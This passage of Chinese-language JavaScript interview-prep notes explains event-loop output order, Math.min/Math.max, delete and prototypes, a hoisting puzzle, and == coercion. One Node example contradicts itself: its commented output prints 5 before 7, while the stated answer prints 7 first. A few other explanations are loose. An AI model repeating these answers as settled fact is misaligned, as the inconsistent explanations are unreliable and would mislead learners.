                while(l < r && nums[r] == nums[r-1]){
                    r--;
                }
                l++;
                r--;
            }else if(sum < 0){
                l++;
            }else if(sum > 0){
                r--;
            }
        }
    }

    return res;
};

```

------

------

# 代码解析题

----

#### 2.26 异步笔试题

请写出下面代码的运行结果：

```js
// 今日头条面试题

async function async1() {

  console.log('async1 start')

  await async2()

  console.log('async1 end')

}

async function async2() {

  console.log('async2')

}

console.log('script start')

setTimeout(function () {

  console.log('settimeout')

})

async1()

new Promise(function (resolve) {

  console.log('promise1')

  resolve()

}).then(function () {

  console.log('promise2')

})

console.log('script end')

```

题目的本质，就是考察setTimeout、promise、async await的实现及执行顺序，以及 JS 的事件循环的相关问题。

答案：

```js
/*
script start
async1 start
async2
promise1
script end
async1 end
promise2
settimeout
*/
```

#### 2.29 代码解释题

**参考答案**：

题目：

```js
var min = Math.min();
max = Math.max();
console.log(min < max);
// 写出执行结果，并解释原因

//console.log(min,max)  //Infinity -Infinity
```

**答案**
false

**解析**

- 按常规的思路，这段代码应该输出 true，毕竟最小值小于最大值。但是却输出 false
- MDN 相关文档是这样解释的
  - Math.min 的参数是 **0 个或者多个**，如果多个参数很容易理解，返回参数中最小的。**如果没有参数，则返回 Infinity，无穷大。**
  - 而 Math.max **没有传递参数时返回的是-Infinity**.所以输出 false

##### Math.max()

由于 `max` 是 `Math` 的静态方法，所以应该像这样使用：`Math.max()`，而不是创建的 `Math` 实例的方法（`Math` 不是构造函数）。

如果没有参数，则结果为 - [`Infinity`](https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Infinity)。

如果有任一参数不能被转换为数值，则结果为 [`NaN`](https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/NaN)。

##### Math.min()

由于 `min` 是 `Math` 的静态方法，所以应该像这样使用：`Math.min()`，而不是作为你创建的 `Math` 实例的方法（Math 不是构造函数）。

如果没有参数，结果为[`Infinity`](https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Infinity)。

如果有任一参数不能被转换为数值，结果为 [`NaN`](https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/NaN)。

------

#### 2.30 代码解析题

**题目**

```js
var company = {
    address: 'beijing'
}
var yideng = Object.create(company);
delete yideng.address
console.log(yideng.address);
// 写出执行结果，并解释原因

```

**答案**
beijing

**解析**
这里的 yideng 通过 prototype 继承了 company的 address。**yideng自己并没有address属性。所以delete操作符的作用是无效的。**

**扩展**
1.delete使用原则：delete 操作符用来删除一个对象的属性。

2.delete在删除一个不可配置的属性时在严格模式和非严格模式下的区别:
（1）在严格模式中，如果属性是一个不可配置（non-configurable）属性，删除时会抛出异常;
（2）非严格模式下返回 false。

3.delete能删除隐式声明的全局变量：这个全局变量其实是global对象(window)的属性

4.delete能删除的：
（1）可配置对象的属性（2）隐式声明的全局变量 （3）用户定义的属性 （4）在ECMAScript 6中，通过 const 或 let 声明指定的 "temporal dead zone" (TDZ) 对 delete 操作符也会起作用

5.delete不能删除的：
（2）显式声明的全局变量 （2）内置对象的内置属性 （3）一个对象从原型继承而来的属性

6.delete删除数组元素：
（1）当你删除一个数组元素时，数组的 length 属性并不会变小，数组元素变成undefined
（2）当用 delete 操作符删除一个数组元素时，被删除的元素已经完全不属于该数组。
（3）如果你想让一个数组元素的值变为 undefined 而不是删除它，可以使用 undefined 给其赋值而不是使用 delete 操作符。此时数组元素是在数组中的

7.delete 操作符与直接释放内存（只能通过解除引用来间接释放）没有关系。



----

函数，原型

```js
function Foo() {
    getName = function() {
        console.log("1")
    }
    return this;
}
Foo.getName = function() {
    console.log("2");
}
Foo.prototype.getName = function() {
    console.log("3");
}

var getName = function() {
    console.log("4")
}

function getName() {
    console.log("5");
}

Foo.getName();  // 2

getName();  // 4

new Foo.getName();  // 2

new Foo().getName();  // 3

new new Foo().getName();  // 3

```



----

## 3.13 js执行顺序的题目，涉及到settimeout、console、process.nextTick、promise.then

```js
console.time('start');

setTimeout(function() {
  console.log(2);
}, 10);

setImmediate(function() {
  console.log(1);
});

new Promise(function(resolve) {
  console.log(3);
  resolve();
  console.log(4);
}).then(function() {
  console.log(5);
  console.timeEnd('start')
});

console.log(6);

process.nextTick(function() {
  console.log(7);
});

console.log(8);
/*
3
4
6
8
5
start: 4.899ms
7
1
2
*/
```

**参考答案：**

综合的执行顺序就是：3——>4——>6——>8——>7——>5——>start: 4.899ms——>1——>2

**解析：**

本题目，考察的就是 node 事件循环 Event Loop 我们可以简单理解Event Loop如下：

1. 所有任务都在主线程上执行，形成一个执行栈(Execution Context Stack)
2. 在主线程之外还存在一个任务队列(Task Queen),系统把异步任务放到任务队列中，然后主线程继续执行后续的任务
3. 一旦执行栈中所有的任务执行完毕，系统就会读取任务队列。如果这时异步任务已结束等待状态，就会从任务队列进入执行栈，恢复执行
4. 主线程不断重复上面的第三步

在上述的例子中，我们明白首先执行主线程中的同步任务，因此依次输出3、4、6、8。当主线程任务执行完毕后，再从Event Loop中读取任务。

Event Loop读取任务的先后顺序，取决于**任务队列（Job queue）中对于不同任务读取规则的限定**。

在Job queue中的队列分为两种类型：

- **宏任务** Macrotask宏任务是指Event Loop在**每个阶段**执行的任务
- **微任务** Microtask微任务是指Event Loop在**每个阶段之间**执行的任务

我们举例来看执行顺序的规定，我们假设

宏任务队列包含任务: A1, A2 , A3

微任务队列包含任务: B1, B2 , B3

执行顺序为，首先执行宏任务队列开头的任务，也就是 A1 任务，执行完毕后，在执行微任务队列里的所有任务，也就是依次执行B1, B2 , B3，执行完后清空微任务队中的任务，接着执行宏任务中的第二个任务A2，依次循环。

了解完了宏任务 Macrotask和微任务 Microtask两种队列的执行顺序之后，我们接着来看，真实场景下这两种类型的队列里真正包含的任务（我们以node V8引擎为例），在node V8中，这两种类型的真实任务顺序如下所示：

宏任务 Macrotask队列真实包含任务：

```js
script(主程序代码),setTimeout, setInterval, setImmediate, I/O, UI rendering
```

微任务 Microtask队列真实包含任务：

```
process.nextTick, Promises, Object.observe, MutationObserver
```

由此我们得到的执行顺序应该为：

```
script(主程序代码)—>process.nextTick—>Promises...——>setTimeout——>setInterval——>setImmediate——> I/O——>UI rendering
```

> 在ES6中宏任务 Macrotask队列又称为ScriptJobs，而微任务 Microtask又称PromiseJobs

我们的题目相对复杂，但是要注意，我们在定义promise的时候，promise构造部分是同步执行的

接下来我们分析我们的题目，首先分析Job queue的执行顺序：

```
script(主程序代码)——>process.nextTick——>promise——>setTimeout——>setImmediate
```

- 主体部分： 定义promise的构造部分是同步的，因此先输出3、4 ，主体部分再输出6、8（同步情况下，就是严格按照定义的先后顺序）
- process.nextTick: 输出7
- promise： 这里的promise部分，严格的说其实是promise.then部分，输出的是5、以及 timeEnd('start')
- setImmediate：输出1，依据上面优先级，应该先setTimeout，但是注意，setTimeout 设置 10ms 延时
- setTimeout ： 输出2



----

## 24. 判断输出



```js
console.log([]==[]);  // false
console.log([1]==[1]) //false

console.log([] == 0);  // true
```

解析：

原始值的比较是值的比较：
它们的值相等时它们就相等（==）
对象和原始值不同，对象的比较并非值的比较,而是引用的比较：
即使两个对象包含同样的属性及相同的值，它们也是不相等的
即使两个数组各个索引元素完全相等，它们也是不相等的,所以[]!=[]

[]==0,是数组进行了隐士转换，空数组会转换成数字0，所以相等

------

#### 
